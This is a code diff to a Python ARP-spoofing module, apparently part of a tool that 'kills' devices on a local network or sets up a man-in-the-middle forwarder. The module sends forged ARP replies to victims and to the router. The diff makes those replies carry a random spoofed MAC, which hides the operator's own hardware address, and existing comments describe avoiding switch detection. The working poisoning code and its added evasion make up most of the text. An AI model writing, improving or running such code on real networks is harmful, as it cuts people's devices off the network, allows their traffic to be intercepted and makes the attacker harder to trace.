@@ -1,11 +1,18 @@
 """ARP spoofing (kill/unkill) and MITM forwarder management."""
 import logging
-from scapy.all import ARP, Ether, conf
+import random
 from time import sleep
 import sys
 import subprocess
 import threading
 from typing import Optional
+
+
+def _random_mac() -> str:
+    """Generate a random locally-administered unicast MAC address."""
+    b = [random.randint(0, 255) for _ in range(6)]
+    b[0] = (b[0] & 0xFE) | 0x02  # unicast + locally administered
+    return ':'.join(f'{x:02x}' for x in b)
 
 from networking.hostblock import HostBlocklist
 from tools.firewall import block_all_for, unblock_all_for
@@ -35,7 +42,6 @@ def enable_ip_forwarding() -> bool:
     res = subprocess.run(['sysctl', '-w', f'{key}=1'], capture_output=True, check=False)
     return res.returncode == 0
 
-
 class Killer:
     """ARP spoofer that kills/unkills network devices.
 
@@ -45,6 +51,7 @@ class Killer:
     """
 
     def __init__(self, router: dict[str, object] = DUMMY_ROUTER) -> None:
+        from scapy.all import conf  # deferred — scapy is slow to import
         self.iface = get_default_iface()
         # Use guid (Scapy/pcap name) for conf.iface, not friendly name
         conf.iface = self.iface.guid if self.iface.guid else self.iface.name
@@ -56,6 +63,7 @@ class Killer:
         # flow. A plain kill relies on ARP-poison + the OS dropping un-forwarded
         # traffic, plus a WinDivert drop-all backstop on Windows.
         self.router: dict[str, object] = router
+        self.spoof_mac: str = _random_mac()
         self.killed: dict[str, dict[str, object]] = {}
         self.storage: dict[str, dict[str, object]] = {}
         self.pf_blocks: set[str] = set()
@@ -91,6 +99,7 @@ class Killer:
         """Get or create persistent L2 socket — prevents Windows socket exhaustion."""
         if self._socket is None:
             try:
+                from scapy.all import conf  # deferred — scapy is slow to import
                 iface = self.iface.guid if hasattr(self.iface, 'guid') and self.iface.guid else self.iface.name
                 self._socket = conf.L2socket(iface=iface)
             except OSError as e:
@@ -156,23 +165,24 @@ class Killer:
         Shared by full ``kill`` and ``one_way_kill`` — the drop *policy* differs
         (both-direction vs outbound-only), the poisoning is identical.
         """
+        from scapy.all import ARP, Ether  # deferred — scapy is slow to import
         # Send ARP reply (is-at) with proper Ethernet destination to poison caches
         # Unicast to specific MAC, not broadcast - avoids switch storm detection
 
-        # Victim: tell victim that router IP is at our MAC
-        to_victim = Ether(dst=victim['mac'])/ARP(
+        # Victim: tell victim that router IP is at our (spoofed) MAC
+        to_victim = Ether(dst=victim['mac'], src=self.spoof_mac)/ARP(
             op=2,
             psrc=self.router['ip'],
-            hwsrc=self.iface.mac,
+            hwsrc=self.spoof_mac,
             pdst=victim['ip'],
             hwdst=victim['mac']
         )
 
-        # Router: tell router that victim IP is at our MAC
-        to_router = Ether(dst=self.router['mac'])/ARP(
+        # Router: tell router that victim IP is at our (spoofed) MAC
+        to_router = Ether(dst=self.router['mac'], src=self.spoof_mac)/ARP(
             op=2,
             psrc=victim['ip'],
-            hwsrc=self.iface.mac,
+            hwsrc=self.spoof_mac,
             pdst=self.router['ip'],
             hwdst=self.router['mac']
         )
@@ -211,6 +221,7 @@ class Killer:
         """
         Unspoofing victim
         """
+        from scapy.all import ARP, Ether  # deferred — scapy is slow to import
         with self._lock:
             if victim['mac'] in self.killed:
                 self.killed.pop(victim['mac'])
